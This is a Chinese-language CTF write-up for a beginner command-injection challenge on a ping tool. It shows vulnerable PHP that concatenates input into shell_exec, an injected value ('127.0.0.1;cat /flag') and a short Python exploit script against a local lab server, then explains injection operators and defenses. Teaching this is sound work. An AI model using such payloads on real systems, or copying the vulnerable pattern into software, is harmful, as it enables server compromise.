# 命令注入

## 题目信息

- **题目名称**：ping 一下试试
- **难度**：★★☆☆☆
- **考点**：命令注入（Command Injection）

## 题目描述

有一个网络工具页面，输入 IP 地址会帮你 ping 一下。但输入的不只是 IP 地址时，会发生什么？

## 解法步骤

### 第一步：分析功能

页面提供了一个输入框，输入 IP 地址后点击 "Ping" 按钮，后端会执行 `ping -c 1 [输入]` 并返回结果。

### 第二步：尝试注入

在输入框中尝试输入不是 IP 的内容，例如 `127.0.0.1;cat /flag`。

由于后端直接将输入拼接到 shell 命令中：
```php
$output = shell_exec('ping -c 1 ' . $ip);
```

分号 `;` 在 shell 中表示命令分隔符，后面的 `cat /flag` 会被当作独立命令执行。

### 第三步：获取 Flag

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13387'
payload = '127.0.0.1;cat /flag'

r = requests.get(f'{BASE}/?ip={payload}')
import re
flag = re.search(r'flag\{[^}]+\}', r.text).group()
print(f'[+] {flag}')
```

## 漏洞原理

### 命令注入

命令注入（Command Injection）是指攻击者通过在输入中插入 shell 命令，使服务器执行非预期的系统命令。其根本原因是**用户输入被直接拼接到了系统命令中**。

常见注入符号：

| 符号 | 作用 |
|------|------|
| `;` | 命令分隔符，依次执行 |
| `\|` | 管道符，前一个命令的输出作为后一个的输入 |
| `&&` | 前一命令成功后才执行后一命令 |
| `\|\|` | 前一命令失败后才执行后一命令 |
| `$(cmd)` | 命令替换，先执行 cmd |
| `` `cmd` `` | 反引号，同命令替换 |

### 防御方法

- 使用 `escapeshellcmd()` 或 `escapeshellarg()` 转义 shell 参数
- 使用 `exec()` 而非 `shell_exec()` 并限定执行路径
- 尽量不要将用户输入拼接到系统命令中
